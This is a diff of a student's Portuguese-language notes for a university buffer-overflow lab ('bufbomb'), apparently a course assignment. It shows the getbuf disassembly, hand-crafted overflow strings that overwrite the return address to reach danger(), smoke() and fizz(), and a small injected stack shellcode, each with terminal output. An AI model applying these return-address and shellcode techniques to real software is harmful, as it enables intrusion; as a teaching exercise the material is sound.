@@ -1,27 +1,111 @@
-@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./hex2raw < stringinvasora.txt 
-@
-@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./hex2raw < stringinvasora.txt > stringinvasora.bin
-@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ hexdump -x stringinvasora.bin
-0000000    0000    0000    0000    0000    0000    0000    0000    0000
-*
-0000020    0000    0000    0000    0000    1206    0040    0000    0000
-0000030    000a                                                        
-0000031
-@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ hexdump -C stringinvasora.bin
-00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
-*
-00000020  00 00 00 00 00 00 00 00  06 12 40 00 00 00 00 00  |..........@.....|
-00000030  0a                                                |.|
-00000031
-@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./bufbomb 
-buf: 0x7ffca097af10
-skdfjdf
-:-( program reached its normal end!
-@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./bufbomb < stringinvasora.bin
-buf: 0x7ffeef57eeb0
+1. 
+
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ objdump -d bufbomb > bufbom.d
+
+SAÍDA:
+
+bufbom.d: 
+
+000000000040145e <getbuf>:
+  40145e:	f3 0f 1e fa          	endbr64
+  401462:	55                   	push   %rbp
+  401463:	48 89 e5             	mov    %rsp,%rbp
+  401466:	48 83 ec 20          	sub    $0x20,%rsp
+  40146a:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
+  40146e:	48 89 c6             	mov    %rax,%rsi
+  401471:	48 8d 05 f4 0c 00 00 	lea    0xcf4(%rip),%rax        # 40216c <_IO_stdin_used+0x16c>
+  401478:	48 89 c7             	mov    %rax,%rdi
+  40147b:	b8 00 00 00 00       	mov    $0x0,%eax
+  401480:	e8 1b fc ff ff       	call   4010a0 <printf@plt>
+  401485:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
+  401489:	48 89 c7             	mov    %rax,%rdi
+  40148c:	e8 4d fe ff ff       	call   4012de <Gets>
+  401491:	b8 01 00 00 00       	mov    $0x1,%eax
+  401496:	c9                   	leave
+  401497:	c3                   	ret
+
+o endereço de danger é: 06 12 40 -> little-endian
+
+então a string invasora fica:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+06 12 40 00 00 00 00 00
+
+após rodar:
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./hex2raw < stringinvasora.txt > stringinvasora.raw
+./bufbomb < stringinvasora.raw
+buf: 0x7ffe1515d5a0
 
 danger! you called danger()
 
 -> cannot be called without validation!
 Ouch!: You caused a segmentation fault!
 Better luck next time
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------->>>
+
+2.
+
+o endereço de smoke é: 67 12 40 -> little endian
+
+então stringinvasora2 fica:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+06 12 40 00 00 00 00 00
+
+67 12 40 00 00 00 00 00
+
+após rodar:
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./hex2raw < stringinvasora2.txt > stringinvasora2.raw
+./bufbomb < stringinvasora2.raw
+buf: 0x7ffd990a96e0
+
+danger! you called danger()
+
+-> cannot be called without validation!
+Smoke!: You called smoke()
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------->>>
+
+3.
+
+após criar o arquivo codigo.s:
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ objdump -d codigo.o
+
+codigo.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   bf 04 03 02 01          mov    $0x1020304,%edi
+   5:   c3                      ret
+
+endereço de buf: 0x7fffffffcef0
+endereço de fizz: 88 12 40 -> little-endian
+
+então stringinvasora3 fica:
+bf 04 03 02 01 c3 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+f0 ce ff ff ff 7f 00 00
+88 12 40 00 00 00 00 00
+
+e após rodar:
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./hex2raw < stringinvasora3.txt > stringinvasora3.raw
+./bufbomb < stringinvasora3.raw
+buf: 0x7fffffffcef0
+Fizz!: You called fizz(0x1020304)
